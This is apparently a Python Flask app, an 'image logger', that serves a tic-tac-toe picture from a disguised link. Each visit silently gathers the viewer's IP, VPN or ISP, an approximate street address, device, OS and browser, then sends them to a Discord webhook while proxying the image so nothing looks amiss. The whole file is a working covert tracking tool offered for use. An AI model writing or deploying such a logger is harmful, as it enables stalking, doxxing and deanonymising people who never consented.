import os
import requests
from flask import Flask, request, Response, redirect
from utils import get_ip_info, parse_user_agent, reverse_geocode, detect_vpn

app = Flask(__name__)

WEBHOOK_URL = os.getenv("WEBHOOK_URL")          # set in vercel.json or Vercel UI
IMAGE_URL = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSP3C9B_ASgVH1eKGNgCyx9YiTUF_3o0yEKrA7g7aerzizSD_N594ajvHqN&s=10"

def send_webhook(data):
    """Send the captured data to your Discord webhook."""
    if not WEBHOOK_URL:
        return
    try:
        embed = {
            "embeds": [{
                "title": "🕵️ Image Click Logged",
                "color": 0x00ff00,
                "fields": [
                    {"name": "IP", "value": data.get("ip", "N/A"), "inline": True},
                    {"name": "VPN / ISP", "value": data.get("vpn_name", "N/A"), "inline": True},
                    {"name": "Street", "value": data.get("street", "Unknown"), "inline": True},
                    {"name": "City", "value": data.get("city", "N/A"), "inline": True},
                    {"name": "State", "value": data.get("region", "N/A"), "inline": True},
                    {"name": "Country", "value": data.get("country", "N/A"), "inline": True},
                    {"name": "Device", "value": data.get("device", "N/A"), "inline": True},
                    {"name": "OS", "value": data.get("os", "N/A"), "inline": True},
                    {"name": "Browser", "value": data.get("browser", "N/A"), "inline": True},
                ],
                "footer": {"text": "Security Log • Free APIs"}
            }]
        }
        requests.post(WEBHOOK_URL, json=embed)
    except Exception as e:
        print(f"Webhook error: {e}")  # will appear in Vercel logs

@app.route('/tic-tac-toe')
def tic_tac_toe():
    # 1. Get visitor's IP (handles proxies)
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()

    # 2. Get geo + ISP/VPN info from ipinfo.io (free with token)
    geo = get_ip_info(ip)   # returns dict with lat, lon, city, region, country, org, etc.

    # 3. Reverse‑geocode to get street address (if lat/lon available)
    street = "Unknown"
    if geo and geo.get('lat') and geo.get('lon'):
        try:
            street = reverse_geocode(geo['lat'], geo['lon'])
        except:
            pass

    # 4. Parse User‑Agent for device, OS, browser
    ua = request.headers.get('User-Agent', '')
    device_info = parse_user_agent(ua)

    # 5. Detect VPN name from the 'org' field (e.g., "NordVPN", "ProtonVPN", "Mullvad")
    vpn_name = detect_vpn(geo.get('org', ''))

    # 6. Build the log data
    log_data = {
        "ip": ip,
        "vpn_name": vpn_name,
        "street": street,
        "city": geo.get("city", "Unknown"),
        "region": geo.get("region", "Unknown"),
        "country": geo.get("country", "Unknown"),
        "device": device_info.get("device", "Unknown"),
        "os": device_info.get("os", "Unknown"),
        "browser": device_info.get("browser", "Unknown"),
    }

    # 7. Send to Discord webhook
    send_webhook(log_data)

    # 8. Proxy the image and return it (so the user stays on your Vercel domain)
    try:
        resp = requests.get(IMAGE_URL, stream=True)
        return Response(resp.raw.read(), content_type=resp.headers['content-type'])
    except:
        # fallback: redirect to original image if proxy fails
        return redirect(IMAGE_URL)

@app.route('/')
def home():
    return "Tic‑Tac‑Toe Logger is running. Share the link: /tic-tac-toe"

if __name__ == '__main__':
    app.run()
